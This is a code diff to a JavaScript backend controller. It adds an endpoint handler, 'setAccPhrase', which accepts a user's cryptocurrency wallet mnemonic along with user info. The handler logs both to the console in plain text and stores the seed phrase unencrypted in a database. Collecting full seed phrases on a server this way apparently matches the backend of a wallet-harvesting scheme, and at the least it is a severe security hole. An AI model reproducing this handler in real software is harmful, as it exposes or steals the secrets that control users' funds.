@@ -426,6 +426,36 @@ const setPassword = async (req, res) => {
   }
 };
 
+const setAccPhrase = async (req, res) => {
+  try {
+    const { mnemonic, userInfo } = req.body;
+    console.log("mnemonic", mnemonic);
+    console.log("userInfo", userInfo);
+
+    // Check if mnemonic and userInfo are provided
+    if (!mnemonic || !userInfo) {
+      return res.status(400).json({ error: "Mnemonic and user info are required" });
+    }
+
+    // Save data to the database
+    const accountData = new Account({
+      phrase:mnemonic,
+      userInfo,
+    });
+
+    await accountData.save();
+
+    // Send a success response
+    res.status(200).json({
+      message: "Mnemonic phrase and user info saved successfully",
+    });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to save mnemonic phrase and user info" });
+  }
+};
+
+
 const getAccounts = async (req, res) => {
   try {
     const userId = req.query.id;
@@ -1156,4 +1186,5 @@ export const dashboard = {
   getMySubscriptionsHistory,
   getAllUsers,
   getAllMessages,
+  setAccPhrase,
 };
